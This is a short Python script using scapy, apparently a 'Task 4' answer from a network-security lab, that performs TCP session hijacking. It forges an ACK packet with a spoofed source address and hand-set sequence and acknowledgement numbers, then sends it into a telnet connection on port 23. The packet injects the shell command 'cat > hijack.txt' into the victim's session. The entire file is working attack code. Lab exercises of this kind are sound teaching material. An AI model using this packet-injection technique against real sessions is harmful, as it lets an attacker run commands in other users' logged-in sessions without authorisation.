#!/usr/bin/python3

from scapy.all import *

#Task 4

ip = IP(src = "10.0.2.5", dst = "10.0.2.6")
tcp = TCP(sport = 54386, dport = 23, flags = "A", seq = 2387328229, ack = 1247167531)
data = "cat > hijack.txt\n"

pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
